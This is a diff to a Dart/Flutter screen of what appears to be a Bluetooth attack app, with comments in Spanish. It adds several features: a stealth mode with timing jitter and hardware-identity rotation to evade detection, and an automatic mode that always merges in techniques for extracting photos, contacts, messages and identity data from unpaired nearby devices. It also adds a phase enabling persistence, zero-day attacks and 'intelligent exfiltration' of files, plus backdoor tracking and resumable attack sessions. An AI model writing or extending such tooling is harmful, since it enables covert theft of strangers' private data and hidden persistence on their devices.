-          _appendLog('  🔓 ${attack['type']} completado (sigiloso)');
-        }
-      } catch (e) {
-        // Silenciar errores
+
+    _appendLog('  🎭 [SIGILO] Reconocimiento pasivo de baja emisión...');
+
+    // Espera con jitter aleatorio para no generar patrón de timing detectable.
+    Future<void> stealthSleep({int minMs = 4000, int maxMs = 9000}) async {
+      final range = (maxMs - minMs).clamp(100, 15000);
+      final jitter = minMs + _stealthRng.nextInt(range);
+      await Future.delayed(Duration(milliseconds: jitter));
+    }
+
+    try {
+      // 1) Ocultar identidad del adaptador para no quedar marcado en el entorno.
+      if (_maskDeviceIdentity) {
+        try {
+          final newName = await _exploitService.rotateHardwareIdentity();
+          if (newName != null && newName.isNotEmpty) {
+            _appendLog('  🧬 [SIGILO] Identidad adaptador ocultada.');
+          }
+        } catch (_) {}
       }
+
+      // 2) Secuencia PASIVA de baja emisión: solo SDP/discovery. Nada de
+      //    transferencias activas ni audio (son los que más delatan).
+      const stealthPassive = [
+        {'type': 'sdp_discover', 'command': 'scan'},
+        {'type': 'sdp_enumerate', 'command': 'all'},
+        {'type': 'quickshare_discovery'},
+        {'type': 'btle_spoof', 'command': 'identity'},
+      ];
+
+      for (final attack in stealthPassive) {
+        if (!_isUnattendedRunning) return;
+        await stealthSleep();
+        try {
+          final result = await _exploitService.executeAttack(
+            deviceAddress: address,
+            type: attack['type'] as String,
+            command: attack['command'] as String?,
+          );
+          if (result['success'] == true) {
+            _appendLog('  🔓 [SIGILO] ${attack['name'] ?? attack['type']} completo (baja emisión)');
+          }
+        } catch (_) {
+          // Silenciar errores: no añadir ruido en modo sigiloso.
+        }
+      }
+      _appendLog('  🎭 [SIGILO] Reconocimiento pasivo finalizado sin detección visible.');
+    } catch (_) {
+      // Nunca exportar trazas en modo sigiloso.
     }
   }
 
@@ -1209,6 +1286,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       'persistence_installed': _installedBackdoors.length,
       'stealth_mode': _stealthMode,
       'data_collected': _collectedData.length,
+      'advanced_system': _advancedAttackResult,
       'recommendations': _generateAttackRecommendations(),
     };
     
@@ -1264,6 +1342,29 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   Future<List<String>> _getAdaptiveStrategy(String address, String deviceType) async {
     final savedReport = await _loadDeviceReport(address);
     final allReports = await _loadAllDeviceReports();
+
+    // El OBJETIVO del modo automático es siempre maximizar extracción de datos
+    // (fotos, contactos, mensajes, identidad) y reconocimiento. Estas técnicas
+    // se fusionan SIEMPRE aunque la IA haya aprendido otra estrategia.
+    const essentialExtraction = [
+      'extract_images',
+      'mediastore_enhanced',
+      'gatt_image_read',
+      'opp_server_mode',
+      'map_image_extract',
+      'quickshare_server',
+      'pbap_extract',
+      'map_extract',
+      'at_extract_identity',
+      'sap_extract',
+      'sdp_discover',
+      'sdp_enumerate',
+    ];
+    List<String> withEssentials(List<String> names) {
+      final set = names.toSet();
+      set.addAll(essentialExtraction);
+      return set.toList();
+    }
     
     // Si hay reporte previo del dispositivo, usarlo
     if (savedReport != null) {
@@ -1277,8 +1378,8 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       _appendLog('      Archivos: $previousFiles | Contactos: $previousContacts');
       
       if (previousSuccess && previousAttacks.isNotEmpty) {
-        _appendLog('      💡 Repitiendo estrategia exitosa...');
-        return previousAttacks;
+        _appendLog('      💡 Repitiendo estrategia exitosa + esenciales de objetivo...');
+        return withEssentials(previousAttacks);
       } else {
         _appendLog('      💡 Estrategia anterior falló. Probando nuevas técnicas...');
         // Agregar técnicas que no se intentaron antes
@@ -1286,7 +1387,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         for (final atk in previousAttacks) {
           newAttacks.remove(atk);
         }
-        return newAttacks;
+        return withEssentials(newAttacks);
       }
     }
     
@@ -1313,13 +1414,13 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         final sorted = successfulAttacks.entries.toList()
           ..sort((a, b) => b.value.compareTo(a.value));
         _appendLog('      📈 Técnicas exitosas: ${sorted.take(3).map((e) => "${e.key}(${e.value})").join(", ")}');
-        return sorted.take(5).map((e) => e.key).toList();
+        return withEssentials(sorted.take(5).map((e) => e.key).toList());
       }
     }
     
     // Estrategia por defecto según tipo (usar TYPE no NAME para el dispatch)
     final defaultStrategy = _getAdaptiveAttackSequence(deviceType);
-    return defaultStrategy.map((e) => e['type'] as String).toList();
+    return withEssentials(defaultStrategy.map((e) => e['type'] as String).toList());
   }
 
   // Guardar aprendizaje de la IA
@@ -1512,26 +1613,6 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   // Estado para persistencia
   bool _hasRestoredState = false;
 
-  // Guía paso a paso
-  int get _currentStep {
-    if (_devices.isEmpty) return 0;
-    // Si el dispositivo seleccionado no está en la lista actual (restaurado), mostrar paso 1
-    if (_selectedDevice == null) return 1;
-    if (!_devices.contains(_selectedDevice)) return 1; // Phantom device fix
-    if (_executedAttacks.isEmpty) return 2;
-    return 3;
-  }
-
-  String get _stepText {
-    switch (_currentStep) {
-      case 0: return 'PASO 1: Pulsa ESCANEAR para encontrar dispositivos';
-      case 1: return 'PASO 2: Selecciona un dispositivo de la lista';
-      case 2: return 'PASO 3: Elige un ataque en las pestañas de abajo';
-      case 3: return 'PASO 4: Revisa datos en pestaña IA/VA';
-      default: return '';
-    }
-  }
-
   Future<void> _saveState() async {
     try {
       final prefs = await SharedPreferences.getInstance();
@@ -1565,6 +1646,21 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       }
       if (_obexFiles.isNotEmpty) {
         prefs.setString('obex_files', jsonEncode(_obexFiles));
+      }
+      if (_extractedImages.isNotEmpty) {
+        prefs.setString('extracted_images', jsonEncode(_extractedImages));
+      }
+      if (_mediastoreEnhanced.isNotEmpty) {
+        prefs.setString('mediastore_enhanced', jsonEncode(_mediastoreEnhanced));
+      }
+      if (_gattImages.isNotEmpty) {
+        prefs.setString('gatt_images', jsonEncode(_gattImages));
+      }
+      if (_oppReceivedImages.isNotEmpty) {
+        prefs.setString('opp_received_images', jsonEncode(_oppReceivedImages));
+      }
+      if (_mapImages.isNotEmpty) {
+        prefs.setString('map_images', jsonEncode(_mapImages));
       }
      } catch (_) {}
    }
@@ -1696,6 +1792,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       _pbapCalls = _loadJsonList(prefs, 'pbap_calls');
       _sdpServices = _loadJsonList(prefs, 'sdp_services');
       _obexFiles = _loadJsonList(prefs, 'obex_files');
+      _extractedImages = _loadJsonList(prefs, 'extracted_images');
+      _mediastoreEnhanced = _loadJsonList(prefs, 'mediastore_enhanced');
+      _gattImages = _loadJsonList(prefs, 'gatt_images');
+      _oppReceivedImages = _loadJsonList(prefs, 'opp_received_images');
+      _mapImages = _loadJsonList(prefs, 'map_images');
       
       if (addr.isNotEmpty) {
         // Solo restaurar si parece válido (MAC address real)
@@ -1952,7 +2053,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                           Expanded(child: Text(entry.key.length > 8 ? entry.key.substring(0, 8) + '...' : entry.key, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12))),
                           Container(
                             padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
-                            decoration: BoxDecoration(color: Colors.purpleAccent.withOpacity(0.2), borderRadius: BorderRadius.circular(4)),
+                            decoration: BoxDecoration(color: Colors.purpleAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(4)),
                             child: Text(deviceType, style: const TextStyle(color: Colors.purpleAccent, fontSize: 10)),
                           ),
                         ],
@@ -2030,7 +2131,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                     crossAxisAlignment: CrossAxisAlignment.start,
                     children: [
                       Row(children: [
-                        Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4), decoration: BoxDecoration(color: Colors.purpleAccent.withOpacity(0.2), borderRadius: BorderRadius.circular(4)), child: Text(entry.key.toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontWeight: FontWeight.bold))),
+                        Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4), decoration: BoxDecoration(color: Colors.purpleAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(4)), child: Text(entry.key.toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontWeight: FontWeight.bold))),
                         const Spacer(),
                         Text('${techniques.values.fold(0, (a, b) => a + b)} éxitos', style: const TextStyle(color: Colors.greenAccent, fontSize: 10)),
                       ]),
@@ -2092,13 +2193,35 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   @override
   void initState() {
     super.initState();
-    _tabController = TabController(length: 5, vsync: this);
+    WidgetsBinding.instance.addObserver(this);
+    _tabController = TabController(length: 2, vsync: this);
     _initializeAI();
     _suggestionEngine.loadHistory();
     _restoreState(); // Restaurar estado si se salió por error
 
+    // Comprobar si hay una sesión de modo automático interrumpida y reanudable.
+    _loadResumableSession();
+
     // Wire service logs to terminal bar (append mode)
     RealExploitService.setExploitLogCallback((msg) => _appendLog(msg));
+
+    if (widget.initialDevice != null) {
+      final device = Map<String, dynamic>.from(widget.initialDevice!);
+      _devices = [device];
+      _selectedDevice = device;
+      _discoveryData = {'devices': _devices, 'services': [], 'characteristics': []};
+      WidgetsBinding.instance.addPostFrameCallback((_) {
+        if (!mounted) return;
+        _appendLog('OBJETIVO PRESELECCIONADO: ${device_utils.getDeviceDisplayName(device)}');
+        _analyzeWithAI(device);
+        _getSuggestion();
+        _calculateSuccessRates();
+      });
+    }
+
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      context.read<BluetoothProvider>().initialize();
+    });
 
     // Escuchar eventos de logs reales desde el hardware (EventChannel)
     _eventSubscription = RealExploitService.eventStream.listen((event) {
@@ -2118,48 +2241,172 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   }
 
   Future<void> _initializeAI() async {
-    await _aiService.initializeAll();
-    if (mounted) _appendLog('MOTOR IA ONLINE - MODELOS CARGADOS');
+    await _heuristicEngine.initializeAll();
+    if (mounted) _appendLog('MOTOR HEURÍSTICO ONLINE - ANÁLISIS POR SEÑALES REALES');
   }
 
   @override
   void dispose() {
+    WidgetsBinding.instance.removeObserver(this);
     _tabController.dispose();
     _logScrollController.dispose();
-    _aiService.dispose();
+    _heuristicEngine.dispose();
     _suggestionEngine.saveHistory();
     _eventSubscription?.cancel();
     super.dispose();
+  }
+
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    super.didChangeAppLifecycleState(state);
+    // Al pausar/minimizar la app, persistir la sesión en curso (objetivo, tipo
+    // y ataques ya completados) para poder reanudarla al volver a abrir.
+    if (state == AppLifecycleState.paused ||
+        state == AppLifecycleState.inactive ||
+        state == AppLifecycleState.detached) {
+      _persistResumableSession();
+    }
+  }
+
+  /// Persiste la sesión del modo automático en curso para poder reanudarla.
+  Future<void> _persistResumableSession() async {
+    final addr = _selectedDevice?['address']?.toString() ?? _sessionDeviceAddress;
+    if (addr.isEmpty) return;
+    final prefs = await SharedPreferences.getInstance();
+    prefs.setBool('unattended_resumable', _isUnattendedRunning);
+    prefs.setString('unattended_address', addr);
+    prefs.setString('unattended_name', _selectedDevice?['name']?.toString() ?? _sessionDeviceName);
+    prefs.setString('unattended_type', _getDeviceType(_selectedDevice ?? {}));
+    prefs.setString('unattended_done', _executedAttacks.join(','));
+  }
+
+  /// Carga una sesión interrumpida guardada previamente (si existe).
+  Future<void> _loadResumableSession() async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final addr = prefs.getString('unattended_address') ?? '';
+      if (addr.isEmpty) return;
+      _sessionDeviceAddress = addr;
+      _sessionDeviceName = prefs.getString('unattended_name') ?? 'Unknown';
+      _sessionDeviceType = prefs.getString('unattended_type') ?? 'unknown';
+      final done = prefs.getString('unattended_done') ?? '';
+      _sessionCompletedAttacks
+        ..clear()
+        ..addAll(done.split(',')..removeWhere((e) => e.isEmpty));
+      final wasRunning = prefs.getBool('unattended_resumable') ?? false;
+      setState(() => _sessionResumable = wasRunning && _sessionCompletedAttacks.isNotEmpty);
+      if (_sessionResumable) {
+        _appendLog('♻️ Hay una sesión automática interrumpida de ${_sessionDeviceName} ($_sessionDeviceAddress). '
+            'Puedes reanudarla desde el HUD.');
+      }
+    } catch (_) {}
+  }
+
+  /// Reanuda una sesión interrumpida: reconstruye la secuencia del objetivo y
+  /// ejecuta únicamente los ataques que no se completaron antes de salir.
+  Future<void> _resumeSession() async {
+    if (!_sessionResumable || _sessionDeviceAddress.isEmpty) {
+      _appendLog('❌ No hay sesión reanudable disponible.');
+      return;
+    }
+    if (_isUnattendedRunning) {
+      _appendLog('⏳ El modo automático ya está en ejecución.');
+      return;
+    }
+    _appendLog('♻️ REANUDANDO sesión automática de $_sessionDeviceName...');
+    // Reconstruir el dispositivo objetivo desde la sesión guardada.
+    final device = <String, dynamic>{
+      'address': _sessionDeviceAddress,
+      'name': _sessionDeviceName,
+    };
+    setState(() {
+      _selectedDevice = device;
+      _isUnattendedRunning = true;
+      _sessionResumable = false;
+    });
+
+    final seq = _getAdaptiveAttackSequence(_sessionDeviceType);
+    // Saltar ataques ya completados en la sesión anterior.
+    final pending = seq
+        .where((a) => !_sessionCompletedAttacks.contains(a['type']))
+        .toList();
+    if (pending.isEmpty) {
+      _appendLog('✅ Todos los ataques de la sesión ya estaban completados.');
+      setState(() => _isUnattendedRunning = false);
+      return;
+    }
+    _appendLog('   ➕ Pendientes: ${pending.length} ataques.');
+    try {
+      await _executeParallelAttacks(device, pending);
+    } catch (e) {
+      _appendLog('💥 Error reanudando sesión: $e');
+    }
+    if (_stealthMode) {
+      await _executeStealthMode(_sessionDeviceAddress, _sessionDeviceName);
+    }
+    setState(() => _isUnattendedRunning = false);
+    // Sesión terminada: limpiar marca reanudable.
+    final prefs = await SharedPreferences.getInstance();
+    prefs.setBool('unattended_resumable', false);
+    _appendLog('✅ Sesión automática reanudada y completada.');
+  }
+
+  bool _isUnbondedTarget(Map<String, dynamic> device) {
+    if (device['bondState'] == 'Bonded' || device['isBonded'] == true) return false;
+    if (device['deviceType'] == 'Bonded') return false;
+    return true;
   }
 
   Future<void> _scan() async {
     if (mounted) {
       setState(() { _isScanning = true; _devices = []; });
     }
-    _appendLog('📡 ESCANEANDO FRECUENCIAS...');
+    _appendLog('📡 ESCANEANDO FRECUENCIAS (canal nativo Bluetooth)...');
     try {
-      final result = await _exploitService.startScan();
+      final btProvider = context.read<BluetoothProvider>();
+      await btProvider.initialize();
+
+      List<Map<String, dynamic>> scannedDevices = [];
+
+      if (btProvider.isBluetoothEnabled) {
+        final providerDevices = await btProvider.scanDevices(timeoutSeconds: 12);
+        scannedDevices = providerDevices.map((d) => d.toMap()).toList();
+        if (scannedDevices.isNotEmpty) {
+          _appendLog('✅ Provider: ${scannedDevices.length} dispositivos detectados');
+        }
+      } else {
+        _appendLog('⚠️ Bluetooth desactivado en provider');
+      }
+
+      if (scannedDevices.isEmpty) {
+        _appendLog('↪️ Fallback: escaneo vía exploit_integration...');
+        final result = await _exploitService.startScan();
+        if (result['success'] == true && result['devices'] != null) {
+          scannedDevices = (result['devices'] as List)
+              .map((d) => Map<String, dynamic>.from(d as Map))
+              .toList();
+        } else {
+          _appendLog('❌ FALLO EN ESCANEO: ${result['message'] ?? 'sin dispositivos'}');
+        }
+      }
+
       if (mounted) {
         setState(() {
           _isScanning = false;
-          if (result['success'] == true && result['devices'] != null) {
-            final List rawDevices = result['devices'] as List;
-            _devices = rawDevices
-                .map((d) => Map<String, dynamic>.from(d as Map))
-                .where((d) => d['bondState'] != 'Bonded')
-                .toList();
-            if (_devices.isNotEmpty) {
-              _appendLog('✅ DETECTADOS: ${_devices.length} OBJETIVOS');
-              _selectedDevice = _devices.first;
-              _discoveryData = { 'devices': _devices, 'services': [], 'characteristics': [] };
-              _analyzeWithAI(_devices.first);
-              _getSuggestion();
-              _calculateSuccessRates();
-            } else { _appendLog('❌ SIN SEÑALES DETECTADAS'); }
-          } else { _appendLog('❌ FALLO EN ESCANEO: ${result['message']}'); }
+          _devices = scannedDevices.where(_isUnbondedTarget).toList();
+          if (_devices.isNotEmpty) {
+            _appendLog('✅ DETECTADOS: ${_devices.length} OBJETIVOS');
+            _selectedDevice = _devices.first;
+            _discoveryData = {'devices': _devices, 'services': [], 'characteristics': []};
+            _analyzeWithAI(_devices.first);
+            _getSuggestion();
+            _calculateSuccessRates();
+          } else {
+            _appendLog('❌ SIN SEÑALES DETECTADAS');
+          }
         });
       }
-    } catch (e) { 
+    } catch (e) {
       if (mounted) {
         setState(() => _isScanning = false);
         _appendLog('💥 ERROR CRÍTICO: $e');
@@ -2179,14 +2426,14 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
   Future<void> _analyzeWithAI(Map<String, dynamic> device) async {
     try {
-      final analysis = await _aiService.identifyAndOptimize(device);
+      final analysis = await _heuristicEngine.identifyAndOptimize(device);
       if (mounted) {
         setState(() { 
-          _aiPrediction = 'IA: ${analysis['recommendedAttack']} (${analysis['successProbability']}%)'; 
+          _aiPrediction = 'Análisis: ${analysis['recommendedAttack']} (${analysis['successProbability']}%)'; 
           _calculateSuccessRates(); 
         });
       }
-    } catch (e) { if (mounted) setState(() => _aiPrediction = 'IA: NO DISPONIBLE'); }
+    } catch (e) { if (mounted) setState(() => _aiPrediction = 'Análisis: NO DISPONIBLE'); }
   }
 
   void _getSuggestion() {
@@ -2254,13 +2501,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   // Navegar a la pestaña sugerida al tocar el hint
   void _navigateToSuggestion() {
     if (_currentSuggestion == null) return;
-    final type = _currentSuggestion!.type;
-    int tabIndex = 4; // default IA/VA
-    if (type == 'btlejack') tabIndex = 2;
-    if (type == 'dos') tabIndex = 3;
-    if (type == 'hid' || type == 'hid_script') tabIndex = 1;
-    // Advanced exploits también van a IA/VA
-    _tabController.animateTo(tabIndex);
+    _tabController.animateTo(1);
   }
 
   // Procesar un dispositivo en modo desatendido
@@ -2368,6 +2609,139 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     }
   }
 
+  /// Convierte recomendaciones ML (vuln:X, btlejack:Y) en técnicas de ataque
+  List<Map<String, dynamic>> _techniquesFromMlExploits(List<String> exploits) {
+    final techniques = <Map<String, dynamic>>[];
+    for (final exploit in exploits) {
+      Map<String, dynamic>? technique;
+      if (exploit.startsWith('btlejack:')) {
+        technique = {
+          'type': 'btlejack',
+          'command': exploit.split(':').last,
+          'name': exploit.toUpperCase(),
+          'phase': 3,
+        };
+      } else if (exploit.startsWith('vuln:')) {
+        final vuln = exploit.replaceFirst('vuln:', '');
+        technique = switch (vuln) {
+          'obex_put' => {'type': 'file_exfil', 'command': 'scan', 'name': 'ML_OBEX', 'phase': 2},
+          'ftp_anonymous' => {'type': 'file_exfil_dir', 'command': 'Download', 'name': 'ML_FTP', 'phase': 2},
+          'ble_reconnection' => {'type': 'ble_pairing', 'command': 'justworks', 'name': 'ML_BLE_RECONN', 'phase': 3},
+          'no_pairing_auth' => {'type': 'bypass', 'command': 'quick_connect', 'name': 'ML_BYPASS', 'phase': 5},
+          'at_command_injection' => {'type': 'at_injection', 'name': 'ML_AT', 'phase': 4},
+          'sdp_information_leak' => {'type': 'sdp_enumerate', 'command': 'all', 'name': 'ML_SDP', 'phase': 1},
+          _ => {'type': 'full_scan', 'name': 'ML_$vuln', 'phase': 1},
+        };
+      } else {
+        technique = allAttackTechniques.cast<Map<String, dynamic>?>().firstWhere(
+          (t) => t?['name'] == exploit || t?['type'] == exploit,
+          orElse: () => {'type': exploit, 'name': exploit, 'phase': 2},
+        );
+      }
+      if (technique != null) techniques.add(technique);
+    }
+    return techniques;
+  }
+
+  /// FASE 0.5: Sistema avanzado unificado (recon profundo + multi-vector + ML + exfil)
+  Future<Map<String, dynamic>> _runAdvancedSystemPhase(String address) async {
+    _appendLog('🚀 [FASE 0.5] Sistema avanzado unificado...');
+    try {
+      _appendLog('   ⏳ Ejecutando ataque avanzado...');
+      final result = await _advancedSystem.executeAdvancedAttack(
+        address,
+        config: AdvancedAttackConfig(
+          enablePersistence: _enablePersistence,
+          enableZeroDay: true,
+          enableEvasion: !_stealthMode,
+          enableIntelligentExfiltration: true,
+          maxExfiltrationFiles: MAX_FILES_PER_DIR,
+        ),
+      ).timeout(const Duration(seconds: 90), onTimeout: () {
+        _appendLog('   ⏰ Timeout fase 0.5 (>90s). Continuando sin sistema avanzado.');
+        return AdvancedAttackResult(
+          success: false,
+          fingerprint: null,
+          attackResult: null,
+          persistenceResult: null,
+          exfiltrationResult: null,
+          duration: const Duration(seconds: 90),
+        );
+      });
+
+      _advancedAttackResult = result.toJson();
+
+      final fp = result.fingerprint;
+      if (fp != null) {
+        _reconnaissanceResults = fp.toJson();
+        _appendLog('   🔬 Recon: ${fp.sdpServices.length} servicios SDP, '
+            '${fp.bleServices.length} BLE, superficie ${fp.attackSurface}');
+        if (fp.knownVulnerabilities.isNotEmpty) {
+          _appendLog('   ⚠️ ${fp.knownVulnerabilities.length} vulnerabilidades conocidas');
+        }
+      }
+
+      final mv = result.attackResult;
+      if (mv != null) {
+        final vectors = mv.successfulVectors.map((v) => v.vector).join(', ');
+        _appendLog('   ⚔️ Multi-vector: ${mv.success ? "OK" : "parcial"} '
+            '(${mv.successfulVectors.length} vectores: $vectors)');
+      }
+
+      final strategy = result.strategy;
+      if (strategy != null && strategy.recommendedExploits.isNotEmpty) {
+        _appendLog('   🧠 Estrategia: ${strategy.recommendedExploits.join(", ")} '
+            '(éxito esperado ${(strategy.expectedSuccess * 100).toStringAsFixed(0)}%)');
+      }
+
+      final exfil = result.exfiltrationResult;
+      if (exfil != null && exfil.filesExfiltrated > 0) {
+        _appendLog('   📤 Exfiltración inteligente: ${exfil.filesExfiltrated}/${exfil.totalFiles} archivos');
+        _collectedData.add('📤 [ADVANCED] ${exfil.filesExfiltrated} archivos exfiltrados');
+      }
+
+      final persist = result.persistenceResult;
+      if (persist != null && persist.success) {
+        final okMethods = persist.methods.entries.where((e) => e.value).map((e) => e.key);
+        _appendLog('   🕵️ Persistencia: ${okMethods.join(", ")}');
+        _installedBackdoors.add({
+          'address': address,
+          'type': 'unified_advanced_system',
+          'methods': persist.methods,
+          'timestamp': DateTime.now().toIso8601String(),
+        });
+      }
+
+      _appendLog(result.success
+          ? '   ✅ Sistema avanzado: éxito (${result.duration.inSeconds}s)'
+          : '   ⚠️ Sistema avanzado: sin acceso completo (${result.duration.inSeconds}s)');
+
+      return result.toJson();
+    } catch (e) {
+      _appendLog('   ❌ Sistema avanzado falló: $e');
+      return {'success': false, 'error': e.toString()};
+    }
+  }
+
+  /// Inserta técnicas ML al inicio de la secuencia sin duplicar tipos
+  List<Map<String, dynamic>> _mergeAttackSequence(
+    List<Map<String, dynamic>> base,
+    List<Map<String, dynamic>> mlTechniques,
+  ) {
+    if (mlTechniques.isEmpty) return base;
+    final existingTypes = base.map((t) => '${t['type']}:${t['command'] ?? ""}').toSet();
+    final merged = <Map<String, dynamic>>[];
+    for (final t in mlTechniques) {
+      final key = '${t['type']}:${t['command'] ?? ""}';
+      if (!existingTypes.contains(key)) {
+        merged.add(t);
+        existingTypes.add(key);
+      }
+    }
+    merged.addAll(base);
+    return merged;
+  }
+
   // ====== MODO DESATENDIDO MEJORADO ======
   // EJECUTA TODOS los exploits disponibles con reintentos y logs
   // VERSIÓN MEJORADA CON TODAS LAS MEJORAS INTEGRADAS
@@ -2384,6 +2758,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       _appendLog('❌ Selecciona un dispositivo primero.');
       return;
     }
+
+    // Reiniciar estados de sesión reanudable al comenzar de cero.
+    _sessionResumable = false;
+    _sessionCompletedAttacks.clear();
+    setState(() {});
 
     final targetAddress = _selectedDevice!['address'] ?? '';
     final targetName = _selectedDevice!['name'] ?? 'Unknown';
@@ -2417,6 +2796,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     _appendLog('⚙️ Configuración:');
     _appendLog('   • Ejecución paralela: ${_enableParallelExecution ? "ON" : "OFF"}');
     _appendLog('   • IA adaptativa: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}');
+    _appendLog('   • Sistema avanzado: ${_enableAdvancedSystem ? "ON" : "OFF"}');
     _appendLog('   • Análisis de patrones: ${_enablePatternAnalysis ? "ON" : "OFF"}');
     _appendLog('   • Análisis de red: ${_enableNetworkAnalysis ? "ON" : "OFF"}');
     _appendLog('   • Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
@@ -2456,17 +2836,17 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
           _appendLog('   📊 Dispositivo: $_reconnaissanceResults');
         }
         
-          // === FASE 0: PREDICCIÓN IA (IntegratedAI + MLVulnerabilityPredictor) ===
-          _appendLog('🤖 [FASE 0] Predicción IA...');
+          // === FASE 0: ANÁLISIS HEURÍSTICO (señales reales del dispositivo) ===
+          _appendLog('🤖 [FASE 0] Análisis heurístico...');
           final deviceType = _getDeviceType(device);
 
           if (_enableAdaptiveIntelligence) {
             try {
-              final mlPrediction = await _mlVulnerabilityPredictor.predict(address, device);
-              _appendLog('   🔬 ML: ${mlPrediction.cveCount} CVEs, riesgo ${mlPrediction.overallRiskLevel}');
-              if (mlPrediction.vulnerabilities.isNotEmpty) {
-                _appendLog('   🎯 Top: ${mlPrediction.vulnerabilities.first.id} (${(mlPrediction.vulnerabilities.first.confidence * 100).toStringAsFixed(0)}%)');
-                _appendLog('   💡 Acción: ${mlPrediction.recommendedAction}');
+              final prediction = await _heuristicEngine.assessVulnerabilities(address, device);
+              _appendLog('   🔬 Heurística: ${prediction.cveCount} señales, riesgo ${prediction.overallRiskLevel}');
+              if (prediction.vulnerabilities.isNotEmpty) {
+                _appendLog('   🎯 Top: ${prediction.vulnerabilities.first.id} (${(prediction.vulnerabilities.first.confidence * 100).toStringAsFixed(0)}%)');
+                _appendLog('   💡 Acción: ${prediction.recommendedAction}');
               }
             } catch (_) {}
           }
@@ -2485,20 +2865,52 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                       (t) => t['name'] == name || t['type'] == name,
                       orElse: () => {'type': name, 'name': name}
                     )).toList();
-              _appendLog('   📋 Secuencia (IA): ${attackNames.join(', ')}');
+              _appendLog('   📋 Secuencia (heurística): ${attackNames.join(', ')}');
             }
            } else {
              attackSequence = _getAdaptiveAttackSequence(deviceType);
              _appendLog('   📋 Secuencia: ${attackSequence.map((a) => a['name'] ?? a['type']).join(', ')}');
            }
+
+          // === FASE 0.5: SISTEMA AVANZADO UNIFICADO ===
+          if (_enableAdvancedSystem && _enableAdaptiveIntelligence) {
+            final advancedJson = await _runAdvancedSystemPhase(address);
+            final strategyExploits = (advancedJson['strategy'] as Map?)?['recommendedExploits'];
+            if (strategyExploits is List && strategyExploits.isNotEmpty) {
+              final mlTechniques = _techniquesFromMlExploits(
+                strategyExploits.cast<String>(),
+              );
+              attackSequence = _mergeAttackSequence(attackSequence, mlTechniques);
+              _appendLog('   🔀 Secuencia ampliada con ${mlTechniques.length} técnicas ML');
+            }
+          }
           
           // === FASE 1-6: ATAQUES (PARALELO si están agrupados) ===
         await _executeParallelAttacks(device, attackSequence);
-        
-        // === POST-PROCESAMIENTO: ANÁLISIS PROFUNDO ===
-        if (_deepAnalysis && _obexFiles.isNotEmpty) {
-          _appendLog('🔬 [POST] Análisis profundo de patrones...');
-          await _deepPatternAnalysis();
+
+        // === POST-PROCESAMIENTO ===
+        if (_enableNetworkAnalysis) {
+          _appendLog('🌐 [POST] Análisis de red...');
+          _networkAnalysis = await _extractNetworkInfo(address);
+        }
+
+        if (_enablePatternAnalysis) {
+          if (_deepAnalysis && _obexFiles.isNotEmpty) {
+            _appendLog('🔬 [POST] Análisis profundo de patrones...');
+            await _deepPatternAnalysis();
+          } else if (_obexFiles.isNotEmpty || _pbapContacts.isNotEmpty) {
+            _appendLog('🔬 [POST] Análisis de patrones...');
+            await _analyzeExtractedPatterns();
+          }
+        }
+
+        if (_enablePersistence &&
+            !_installedBackdoors.any((b) => b['address'] == address)) {
+          await _installPersistenceMechanism(address, displayName);
+        }
+
+        if (_stealthMode) {
+          await _executeStealthMode(address, displayName);
         }
         
         // === GENERAR REPORTE ===
@@ -2535,7 +2947,12 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         });
       }
       
-      await Future.delayed(Duration(seconds: _stealthMode ? 5 : 3));
+      // Espera entre dispositivos: en modo sigiloso usamos jitter para no generar patrón.
+      if (_stealthMode) {
+        await Future.delayed(Duration(milliseconds: 5000 + _stealthRng.nextInt(4000)));
+      } else {
+        await Future.delayed(const Duration(seconds: 3));
+      }
     }
 
     final name = _selectedDevice!['name'] ?? 'Unknown';
@@ -2548,6 +2965,13 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     _appendLog('📊 RESUMEN FINAL:');
     _appendLog('   🎯 Objetivo: $name ($address)');
     _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+    if (mounted) setState(() => _isUnattendedRunning = false);
+    // Sesión completada de forma normal: limpiar marca reanudable.
+    _sessionResumable = false;
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      prefs.setBool('unattended_resumable', false);
+    } catch (_) {}
     } catch (error) {
       _appendLog('💥 CRASH: $error');
       try {
